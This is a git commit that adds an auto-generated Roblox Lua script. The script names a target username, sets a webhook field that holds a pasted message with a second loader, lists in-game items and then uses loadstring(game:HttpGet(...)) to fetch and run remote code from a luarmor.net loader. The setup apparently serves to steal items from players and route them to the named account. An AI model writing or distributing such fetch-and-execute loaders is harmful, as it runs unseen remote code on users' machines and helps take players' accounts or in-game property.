d79309b5ffe00096ff68af62e66dc52dee48c4b9
sab-api <carlosignaa2019@gmail.com>
2026-09-22 18:22:18 -0300

    Add script Cleahub_1790112138534.lua

---
+++ scripts/Cleahub_1790112138534.lua
@@ -0,0 +1,10 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "rodolfo29922"
+getgenv().WEBHOOK_URL = "📄 **Script Generated** ```lua loadstring(game:HttpGet(\"https://oblivionhub.xyz/api/paste?id=6377e514af0f2e28442f858e45260ea4&raw=true\"))() ```"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {}
+getgenv().NORMAL_GEARS = {}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
